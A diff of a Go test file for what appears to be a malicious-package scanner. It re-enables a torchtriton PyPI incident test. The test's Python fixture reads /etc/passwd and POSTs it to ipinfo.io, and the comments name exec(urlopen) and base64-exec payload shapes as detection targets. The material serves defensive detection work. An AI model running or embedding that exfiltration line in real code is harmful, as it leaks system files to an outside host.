@@ -180,26 +180,24 @@ func TestIncidents_PyPI(t *testing.T) {
 		// concrete C2 hostname; we use a stand-in here that hits our
 		// blocklist (ipinfo.io was a similar shape used in the wild).
 		//
-		// The "send local files via HTTP POST to ipinfo / ipify" pattern
-		// shows up in the offending package's main.py. Our source-pattern
-		// detector currently scans .js files only — extend to .py to flag
-		// this. Until then this is a documented gap.
-		t.Skip("source-pattern scanner is currently JS-only; extend isJSSource to also cover .py and re-enable")
-
-		// Once enabled:
-		// src := usecase.PackageSource{
-		// 	Files: map[string][]byte{
-		// 		"triton/runtime/jit.py": []byte(`
-		// 			import urllib.request, os
-		// 			data = open('/etc/passwd').read()
-		// 			urllib.request.urlopen('https://ipinfo.io/ip', data=data.encode())
-		// 		`),
-		// 	},
-		// }
-		// caps := DetectSourcePatterns(src)
-		// if !hasCap(caps, domain.CapSuspiciousURL) {
-		// 	t.Fatalf("want CapSuspiciousURL (ipinfo.io exfil), got %v", caps)
-		// }
+		// Plans A + C (detection-gaps-roadmap): URL scan now runs over
+		// .py, and pythonObfuscatedPayloadPattern catches the
+		// exec(urlopen(...)) / exec(base64.b64decode(...)) shapes.
+		// The torchtriton fixture below trips the URL scan via
+		// ipinfo.io (already on the suspicious-host blocklist).
+		src := usecase.PackageSource{
+			Files: map[string][]byte{
+				"triton/runtime/jit.py": []byte(`
+					import urllib.request, os
+					data = open('/etc/passwd').read()
+					urllib.request.urlopen('https://ipinfo.io/ip', data=data.encode())
+				`),
+			},
+		}
+		caps := DetectSourcePatterns(src)
+		if !hasCap(caps, domain.CapSuspiciousURL) {
+			t.Fatalf("want CapSuspiciousURL (ipinfo.io exfil), got %v", caps)
+		}
 	})
 
 	t.Run("colourama_2017 — typosquat of colorama", func(t *testing.T) {
